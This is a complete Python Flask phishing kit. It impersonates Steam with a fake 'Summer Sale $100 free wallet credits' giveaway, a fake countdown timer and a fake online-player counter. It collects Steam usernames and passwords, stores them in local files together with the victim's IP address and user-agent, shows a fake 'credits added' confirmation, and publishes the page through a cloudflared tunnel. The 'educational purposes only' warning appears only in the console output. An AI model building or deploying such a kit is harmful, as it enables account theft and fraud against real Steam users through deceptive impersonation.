import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'steam-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Steam Wallet")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['st_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Steam Summer Sale - Free Wallet Credits</title>
        <style>
            :root {
                --steam-blue: #1b2838;
                --steam-green: #5c7e10;
                --steam-light: #c6d4df;
                --steam-dark: #171a21;
                --steam-accent: #66c0f4;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #1b2838 0%, #171a21 100%);
                font-family: 'Motiva Sans', Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #c6d4df;
                padding: 15px;
            }
            
            .login-box {
                background: rgba(23, 26, 33, 0.95);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 520px;
                padding: 25px 20px;
                border-radius: 8px;
                text-align: center;
                border: 1px solid #3d4450;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                margin: 0 auto;
            }
            
            @media (min-width: 768px) {
                .login-box {
                    padding: 40px;
                }
            }
            
            .steam-logo-container {
                display: flex;
                justify-content: center;
                align-items: center;
                margin-bottom: 20px;
            }
            
            .steam-logo-img {
                height: 60px;
                width: auto;
            }
            
            .summer-banner {
                background: linear-gradient(90deg, #ff4500 0%, #ff9a00 50%, #ff4500 100%);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 18px;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
                border: 3px solid #ff9a00;
                animation: summerGlow 2s infinite;
            }
            
            @media (min-width: 768px) {
                .summer-banner {
                    font-size: 24px;
                    padding: 18px;
                }
            }
            
            @keyframes summerGlow {
                0% { box-shadow: 0 0 15px rgba(255, 69, 0, 0.5); }
                50% { box-shadow: 0 0 30px rgba(255, 154, 0, 0.8); }
                100% { box-shadow: 0 0 15px rgba(255, 69, 0, 0.5); }
            }
            
            .wallet-banner {
                background: linear-gradient(90deg, #5c7e10 0%, #8db600 50%, #5c7e10 100%);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
                font-weight: 900;
                font-size: 24px;
                border: 2px solid #8db600;
            }
            
            @media (min-width: 768px) {
                .wallet-banner {
                    font-size: 32px;
                    padding: 20px;
                }
            }
            
            .giveaway-container {
                background: rgba(102, 192, 244, 0.1);
                border: 2px dashed var(--steam-accent);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: white;
                font-weight: 600;
            }
            
            @media (min-width: 768px) {
                h1 {
                    font-size: 36px;
                }
            }
            
            .subtitle {
                color: #8f98a0;
                font-size: 14px;
                margin-bottom: 20px;
                line-height: 1.6;
            }
            
            @media (min-width: 768px) {
                .subtitle {
                    font-size: 16px;
                    margin-bottom: 30px;
                }
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #ff4c4c;
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 22px;
                color: #ff9999;
                text-align: center;
                font-weight: bold;
            }
            
            @media (min-width: 768px) {
                .timer {
                    font-size: 28px;
                    padding: 15px;
                }
            }
            
            .game-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 10px;
                margin: 20px 0;
            }
            
            @media (min-width: 768px) {
                .game-grid {
                    grid-template-columns: repeat(3, 1fr);
                    gap: 15px;
                    margin: 25px 0;
                }
            }
            
            .game-item {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #3d4450;
                border-radius: 6px;
                padding: 12px;
                text-align: center;
                transition: all 0.3s;
                cursor: pointer;
            }
            
            .game-item:hover {
                border-color: var(--steam-accent);
                background: rgba(102, 192, 244, 0.1);
                transform: translateY(-5px);
            }
            
            .game-icon {
                font-size: 24px;
                margin-bottom: 8px;
                color: var(--steam-accent);
            }
            
            @media (min-width: 768px) {
                .game-icon {
                    font-size: 28px;
                }
            }
            
            .game-price {
                font-size: 11px;
                color: #5c7e10;
                font-weight: bold;
                margin-top: 6px;
            }
            
            @media (min-width: 768px) {
                .game-price {
                    font-size: 12px;
                }
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #8f98a0;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            @media (min-width: 768px) {
                .form-label {
                    font-size: 14px;
                    margin-bottom: 8px;
                }
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: rgba(255, 255, 255, 0.05);
                border: 2px solid #3d4450;
                border-radius: 4px;
                color: white;
                font-size: 15px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
            
            @media (min-width: 768px) {
                input {
                    padding: 16px;
                    font-size: 16px;
                }
            }
            
            input:focus {
                border-color: var(--steam-accent);
                outline: none;
                background: rgba(255, 255, 255, 0.1);
            }
            
            input::placeholder {
                color: #6d7883;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #5c7e10, #8db600);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 4px;
                font-weight: 700;
                font-size: 16px;
                width: 100%;
                margin: 20px 0 12px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
            
            @media (min-width: 768px) {
                .login-btn {
                    padding: 18px;
                    font-size: 18px;
                    margin: 25px 0 15px;
                }
            }
            
            .login-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 10px 25px rgba(92, 126, 16, 0.4);
            }
            
            .login-btn:active {
                transform: translateY(-1px);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #c6d4df;
                font-size: 14px;
            }
            
            @media (min-width: 768px) {
                .benefit-item {
                    font-size: 16px;
                    margin: 15px 0;
                }
            }
            
            .benefit-icon {
                color: #5c7e10;
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                flex-shrink: 0;
            }
            
            .sale-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #ff4500, #ff9a00);
                color: white;
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                margin-left: 8px;
            }
            
            @media (min-width: 768px) {
                .sale-badge {
                    padding: 6px 16px;
                    font-size: 14px;
                }
            }
            
            .warning-note {
                color: #ff9999;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid #3d4450;
                padding-top: 15px;
                text-align: center;
            }
            
            @media (min-width: 768px) {
                .warning-note {
                    font-size: 12px;
                    margin-top: 25px;
                    padding-top: 20px;
                }
            }
            
            .online-counter {
                background: rgba(92, 126, 16, 0.1);
                border: 2px solid var(--steam-green);
                border-radius: 8px;
                padding: 10px;
                margin: 15px 0;
                font-size: 13px;
                color: #8db600;
            }
            
            @media (min-width: 768px) {
                .online-counter {
                    font-size: 14px;
                    padding: 12px;
                    margin: 20px 0;
                }
            }
            
            /* Prevent text selection on mobile */
            .no-select {
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }
            
            /* Improve tap targets on mobile */
            input, button {
                min-height: 44px;
            }
            
            .game-item {
                min-height: 80px;
                display: flex;
                flex-direction: column;
                justify-content: center;
            }
        </style>
    </head>
    <body class="no-select">
        <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <div class="login-box">
                <div class="steam-logo-container">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png" 
                         alt="Steam Logo" 
                         class="steam-logo-img"
                         onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTExLjk3OSAwQzUuNjc4IDAgMC41MTEgNS4xNjcgMC41MTEgMTEuNDY4YzAgNi4zMDEgNS4xNjcgMTEuNDY4IDExLjQ2OCAxMS40NjggNi4zMDEgMCAxMS40NjktNS4xNjcgMTEuNDY5LTExLjQ2OCBDMjMuNDQ3IDUuMTY3IDE4LjI4IDAgMTEuOTc5IDB6IE0xNS4zMiAxNi4xMzZjLTAuNTExIDAtMC45NC0wLjQxOC0wLjk0LTAuOTRzMC40MTktMC45NCAwLjk0LTAuOTRzMC45NCAwLjQxOCAwLjk0IDAuOTQgUzE1LjgzMSAxNi4xMzYgMTUuMzIgMTYuMTM2ek0xNy4xODYgMTMuMTExYy0wLjUxMSAwLTAuOTQtMC40MTgtMC45NC0wLjkzOXMwLjQxOS0wLjk0IDAuOTQtMC45NHMwLjkzOSAwLjQxOCAwLjkzOSAwLjk0IFMxNy42OTcgMTMuMTExIDE3LjE4NiAxMy4xMTF6IE02LjY1NyAxNi4xMzZjLTAuNTExIDAtMC45NC0wLjQxOC0wLjk0LTAuOTRzMC40MTktMC45NCAwLjk0LTAuOTRzMC45NCAwLjQxOCAwLjk0IDAuOTQgUzcuMTY4IDE2LjEzNiA2LjY1NyAxNi4xMzZ6IE04LjUyMyAxMy4xMTFjLTAuNTExIDAtMC45NC0wLjQxOC0wLjk0LTAuOTM5czAuNDE5LTAuOTQgMC45NC0wLjk0czAuOTM5IDAuNDE4IDAuOTM5IDAuOTQgUzkuMDM0IDEzLjExMSA4LjUyMyAxMy4xMTF6IE0xMi45NzkgNi44MjNjLTIuNTY3IDAtNC42NTIgMi4wODUtNC42NTIgNC42NTJzMi4wODUgNC42NTIgNC42NTIgNC42NTJzNC42NTItMi4wODUgNC42NTItNC42NTIgUzE1LjU0NiA2LjgyMyAxMi45NzkgNi44MjN6IiBmaWxsPSIjNjZjMGY0Ii8+Cjwvc3ZnPgo='">
                </div>
                
                <div class="summer-banner">
                    🎮 SUMMER SALE GIVEAWAY 🎮
                </div>
                
                <div class="wallet-banner">
                    $100 FREE WALLET CREDITS
                </div>
                
                <div class="giveaway-container">
                    <h1>Claim Free Wallet Credits</h1>
                    <div class="subtitle">
                        Limited to first 500 users! <span class="sale-badge">90% OFF</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        10:00
                    </div>
                </div>
                
                <div class="online-counter">
                    🔥 <strong>24,583,721 players online</strong> - Join the giveaway!
                </div>
                
                <div class="game-grid">
                    <div class="game-item">
                        <div class="game-icon">🎮</div>
                        <div>Cyberpunk 2077</div>
                        <div class="game-price">$59.99</div>
                    </div>
                    <div class="game-item">
                        <div class="game-icon">⚔️</div>
                        <div>Elden Ring</div>
                        <div class="game-price">$59.99</div>
                    </div>
                    <div class="game-item">
                        <div class="game-icon">🚗</div>
                        <div>Forza Horizon 5</div>
                        <div class="game-price">$59.99</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        $100 Steam Wallet Credits
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        3 Free Games of Your Choice
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Exclusive Summer Sale Badge
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Trading Cards & Emoticons
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Priority Support Access
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">STEAM ACCOUNT NAME</label>
                        <input type="text" name="username" placeholder="Enter your Steam account name" required autocomplete="off">
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">PASSWORD</label>
                        <input type="password" name="password" placeholder="Enter your password" required autocomplete="off">
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🎁 Claim $100 Wallet Credits
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ This Summer Sale promotion ends in 10 minutes. Credits will be added within 1 hour of verification.
                </div>
            </div>
        </div>
        
        <script>
            // Prevent zoom on input focus on mobile
            document.addEventListener('DOMContentLoaded', function() {
                let viewport = document.querySelector('meta[name="viewport"]');
                let originalContent = viewport.getAttribute('content');
                
                document.addEventListener('focusin', function() {
                    viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
                });
                
                document.addEventListener('focusout', function() {
                    viewport.setAttribute('content', originalContent);
                });
            });
            
            // Countdown timer
            let timeLeft = 600; // 10 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 60) {
                    countdownElement.style.background = 'rgba(255, 0, 0, 0.2)';
                    countdownElement.style.animation = 'summerGlow 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Giveaway Ended!";
                    countdownElement.style.color = '#ff0000';
                }
            }
            
            updateTimer();
            
            // Simulate online counter update
            setInterval(() => {
                const onlineCounter = document.querySelector('.online-counter strong');
                if (onlineCounter) {
                    const current = parseInt(onlineCounter.textContent.replace(/,/g, ''));
                    const change = Math.floor(Math.random() * 1000) - 500;
                    const newCount = Math.max(24000000, current + change);
                    onlineCounter.textContent = newCount.toLocaleString();
                }
            }, 5000);
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('st_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Steam Summer Sale Giveaway\n")
        file.write(f"Promised: $100 Wallet Credits\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing Wallet Credits - Steam</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #1b2838 0%, #171a21 100%);
                font-family: 'Motiva Sans', Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #c6d4df;
                padding: 15px;
            }
            .container {
                text-align: center;
                background: rgba(23, 26, 33, 0.95);
                backdrop-filter: blur(10px);
                padding: 25px 20px;
                border-radius: 8px;
                max-width: 600px;
                width: 100%;
                border: 1px solid #3d4450;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                margin: 0 auto;
            }
            
            @media (min-width: 768px) {
                .container {
                    padding: 50px;
                }
            }
            
            .steam-logo {
                font-size: 32px;
                font-weight: 800;
                color: white;
                margin-bottom: 15px;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            @media (min-width: 768px) {
                .steam-logo {
                    font-size: 42px;
                    margin-bottom: 20px;
                }
            }
            
            .steam-logo-container {
                display: flex;
                justify-content: center;
                margin-bottom: 20px;
            }
            
            .steam-icon-img {
                width: 80px;
                height: 80px;
                margin: 0 auto 15px;
                filter: drop-shadow(0 0 20px rgba(102, 192, 244, 0.5));
                animation: float 3s ease-in-out infinite;
            }
            
            @media (min-width: 768px) {
                .steam-icon-img {
                    width: 100px;
                    height: 100px;
                    margin-bottom: 25px;
                }
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-10px); }
            }
            
            .processing-container {
                background: rgba(102, 192, 244, 0.1);
                border: 2px solid #66c0f4;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            @media (min-width: 768px) {
                .processing-container {
                    padding: 30px;
                    margin: 30px 0;
                }
            }
            
            .progress-container {
                width: 100%;
                height: 8px;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .progress-container {
                    height: 10px;
                    margin: 25px 0;
                }
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #5c7e10, #8db600, #66c0f4);
                border-radius: 5px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .wallet-activated {
                background: rgba(92, 126, 16, 0.1);
                border: 2px solid #5c7e10;
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            @media (min-width: 768px) {
                .wallet-activated {
                    padding: 25px;
                    margin: 25px 0;
                }
            }
            
            .checkmark {
                color: #5c7e10;
                font-weight: bold;
                font-size: 20px;
                margin-right: 12px;
                flex-shrink: 0;
            }
            
            @media (min-width: 768px) {
                .checkmark {
                    font-size: 22px;
                    margin-right: 15px;
                }
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #c6d4df;
                font-size: 16px;
            }
            
            @media (min-width: 768px) {
                .status-item {
                    font-size: 18px;
                    margin: 18px 0;
                }
            }
            
            .wallet-amount {
                font-size: 42px;
                font-weight: 900;
                background: linear-gradient(45deg, #5c7e10, #8db600);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin: 15px 0;
                text-shadow: 0 0 20px rgba(92, 126, 16, 0.3);
            }
            
            @media (min-width: 768px) {
                .wallet-amount {
                    font-size: 56px;
                    margin: 20px 0;
                }
            }
            
            .currency-symbol {
                color: #8db600;
                font-size: 28px;
                margin-right: 8px;
                vertical-align: middle;
            }
            
            @media (min-width: 768px) {
                .currency-symbol {
                    font-size: 36px;
                    margin-right: 10px;
                }
            }
            
            .game-library {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid #3d4450;
                border-radius: 8px;
                padding: 15px;
                margin: 15px 0;
                font-size: 13px;
                color: #8f98a0;
                text-align: left;
            }
            
            @media (min-width: 768px) {
                .game-library {
                    font-size: 14px;
                    padding: 20px;
                    margin: 20px 0;
                }
            }
            
            .game-title {
                color: #66c0f4;
                font-weight: bold;
                margin: 8px 0;
            }
            
            h2 {
                margin-bottom: 8px;
                color: #66c0f4;
                font-size: 22px;
            }
            
            @media (min-width: 768px) {
                h2 {
                    font-size: 24px;
                    margin-bottom: 10px;
                }
            }
            
            p {
                color: #8f98a0;
                margin-bottom: 20px;
                font-size: 15px;
                line-height: 1.5;
            }
            
            @media (min-width: 768px) {
                p {
                    margin-bottom: 30px;
                }
            }
            
            small {
                color: #6d7883;
                font-size: 12px;
            }
            
            /* Prevent text selection */
            .no-select {
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body class="no-select">
        <div class="container">
            <div class="steam-logo-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png" 
                     alt="Steam Logo" 
                     class="steam-icon-img"
                     onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTExLjk3OSAwQzUuNjc4IDAgMC41MTEgNS4xNjcgMC41MTEgMTEuNDY4YzAgNi4zMDEgNS4xNjcgMTEuNDY4IDExLjQ2OCAxMS40NjggNi4zMDEgMCAxMS40NjktNS4xNjcgMTEuNDY5LTExLjQ2OCBDMjMuNDQ3IDUuMTY3IDE4LjI4IDAgMTEuOTc5IDB6IE0xNS4zMiAxNi4xMzZjLTAuNTExIDAtMC45NC0wLjQxOC0wLjk0LTAuOTRzMC40MTktMC45NCAwLjk0LTAuOTRzMC45NCAwLjQxOCAwLjk0IDAuOTQgUzE1LjgzMSAxNi4xMzYgMTUuMzIgMTYuMTM2ek0xNy4xODYgMTMuMTExYy0wLjUxMSAwLTAuOTQtMC40MTgtMC45NC0wLjkzOXMwLjQxOS0wLjk0IDAuOTQtMC45NHMwLjkzOSAwLjQxOCAwLjkzOSAwLjk0IFMxNy42OTcgMTMuMTExIDE3LjE4NiAxMy4xMTF6IE02LjY1NyAxNi4xMzZjLTAuNTExIDAtMC45NC0wLjQxOC0wLjk0LTAuOTRzMC40MTktMC45NCAwLjk0LTAuOTRzMC45NCAwLjQxOCAwLjk0IDAuOTQgUzcuMTY4IDE2LjEzNiA2LjY1NyAxNi4xMzZ6IE04LjUyMyAxMy4xMTFjLTAuNTExIDAtMC45NC0wLjQxOC0wLjk0LTAuOTM5czAuNDE5LTAuOTQgMC45NC0wLjk0czAuOTM5IDAuNDE4IDAuOTM5IDAuOTQgUzkuMDM0IDEzLjExMSA4LjUyMyAxMy4xMTF6IE0xMi45NzkgNi44MjNjLTIuNTY3IDAtNC42NTIgMi4wODUtNC42NTIgNC42NTJzMi4wODUgNC42NTIgNC42NTIgNC42NTJzNC42NTItMi4wODUgNC42NTItNC42NTIgUzE1LjU0NiA2LjgyMyAxMi45NzkgNi44MjN6IiBmaWxsPSIjNjZjMGY0Ii8+Cjwvc3ZnPgo='">
            </div>
            
            <div class="steam-logo">Steam</div>
            
            <div class="wallet-amount">
                <span class="currency-symbol">$</span>100.00
            </div>
            
            <h2>Wallet Credits Added!</h2>
            <p>Your Summer Sale giveaway is being processed</p>
            
            <div class="processing-container">
                <h3>Processing Your Giveaway</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p style="color: #8f98a0;">Adding wallet credits and selecting free games...</p>
            </div>
            
            <div class="game-library">
                <div style="color: #66c0f4; margin-bottom: 8px; font-weight: bold;">Selected Free Games:</div>
                <div class="game-title">Cyberpunk 2077</div>
                <div class="game-title">Elden Ring</div>
                <div class="game-title">Forza Horizon 5</div>
                <div style="margin-top: 10px; color: #5c7e10;">✓ Added to your library</div>
            </div>
            
            <div class="wallet-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>$100.00 added</strong> to your Steam Wallet
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Transaction ID:</strong> STEAM-<span id="transaction-id">0000000</span>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>3 Free Games</strong> added to your library
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Summer Sale Badge</strong> unlocked
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Trading Cards</strong> available in inventory
                </div>
            </div>
            
            <p style="color: #8f98a0; margin-top: 25px; font-size: 14px;">
                You will be redirected to Steam shortly...
                <br>
                <small style="color: #6d7883;">Your wallet credits will be available within 1 hour</small>
            </p>
        </div>
        
        <script>
            // Generate random transaction ID
            document.getElementById('transaction-id').textContent = 
                Math.floor(Math.random() * 10000000).toString().padStart(7, '0');
            
            // Animate wallet amount
            setTimeout(() => {
                const walletAmount = document.querySelector('.wallet-amount');
                walletAmount.style.transform = 'scale(1.1)';
                walletAmount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    walletAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
            
            // Prevent zoom on mobile
            document.addEventListener('DOMContentLoaded', function() {
                let viewport = document.querySelector('meta[name="viewport"]');
                let originalContent = viewport.getAttribute('content');
                
                document.addEventListener('focusin', function() {
                    viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
                });
                
                document.addEventListener('focusout', function() {
                    viewport.setAttribute('content', originalContent);
                });
            });
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Steam Wallet Public Link: {tunnel_url}")
            print(f"💰 Promising: $100 FREE Steam Wallet Credits")
            print(f"💾 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real Steam credentials!")
            print("⚠️  Steam accounts have games worth thousands of dollars!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5006, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Steam Summer Sale Giveaway Page...")
    print("📱 Port: 5006")
    print("💾 Save location: ~/storage/downloads/SteamWallet/")
    print("💰 Promising: $100 FREE Steam Wallet Credits")
    print("🎮 Bonus: 3 Free AAA Games")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5006")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)